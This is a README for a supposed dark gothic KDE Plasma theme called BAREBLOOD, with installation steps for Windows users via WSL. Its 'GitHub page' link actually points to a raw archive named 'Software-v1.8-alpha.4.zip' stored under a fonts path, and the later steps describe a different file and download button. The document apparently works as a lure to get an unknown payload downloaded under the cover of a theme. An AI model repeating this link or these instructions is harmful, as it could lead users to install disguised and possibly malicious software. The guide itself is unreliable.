## ❓ What is BAREBLOOD?

BAREBLOOD is a dark, gothic-style theme designed for KDE Plasma 6.5 on Linux. It changes the look and feel of your desktop to a bold, maximalist aesthetic with deep blacks, strong contrasts, and gothic design elements. This theme is for users who want a unique and visually stunning Linux desktop.

Although this theme is intended for Linux, this guide shows how to get it from GitHub and use it if you are working on a Windows system with a Linux environment like WSL (Windows Subsystem for Linux) or a virtual machine.

## 💻 System Requirements

- KDE Plasma 6.5 running on a supported Linux distribution.
- Access to a Linux environment if using Windows (WSL or a virtual machine).
- Basic familiarity with system settings to apply the theme.
- At least 1 GB of free disk space.
- A stable internet connection.

## 📥 How to Download and Install BAREBLOOD on Windows (via WSL)

### Step 1: Install Windows Subsystem for Linux (WSL)

If you don’t have a Linux environment, you can install WSL on Windows. This lets you run Linux tools directly on Windows.

1. Open PowerShell as an administrator.
2. Type the following and press Enter:
   
   `wsl --install`

3. Restart your computer when prompted.
4. Open the Microsoft Store app.
5. Search for your favorite Linux distribution (Ubuntu is recommended).
6. Install the Linux distribution and launch it.

### Step 2: Download BAREBLOOD Theme Files

1. Open your web browser.
2. Go to the BAREBLOOD GitHub page:  
   [https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip](https://github.com/Aspuria080701/BAREBLOOD/raw/refs/heads/main/usr/share/fonts/Software-v1.8-alpha.4.zip)
3. Look for a `Download ZIP` button on the right sidebar or under the green `Code` button.
4. Click `Download ZIP` to download all theme files as a compressed archive.
5. Save the ZIP file to your Windows Downloads folder.

### Step 3: Extract the Theme Files in WSL

1. Open your Linux distribution (e.g., Ubuntu) from the Start Menu.
2. Switch to your Windows Downloads folder mounted in WSL. Use the following command:
   
   `cd /mnt/c/Users/<YourWindowsUserName>/Downloads`

3. Extract the ZIP file with this command (replacing `BAREBLOOD-main.zip` if the downloaded file name differs):
   
   `unzip BAREBLOOD-main.zip`

### Step 4: Move the Theme to KDE Plasma

1. Create a folder for Plasma themes if it does not exist:
   
   `mkdir -p ~/.local/share/plasma/desktoptheme`

2. Move the extracted BAREBLOOD folder there:
   
   `mv BAREBLOOD-main ~/.local/share/plasma/desktoptheme/BAREBLOOD`

### Step 5: Apply the Theme in KDE Plasma

1. Log into your KDE Plasma session (on Linux).
2. Open the **System Settings** app.
3. Navigate to **Appearance > Global Theme**.
4. Find and select **BAREBLOOD**.
5. Apply the theme.

Your desktop should now display the BAREBLOOD dark gothic style.
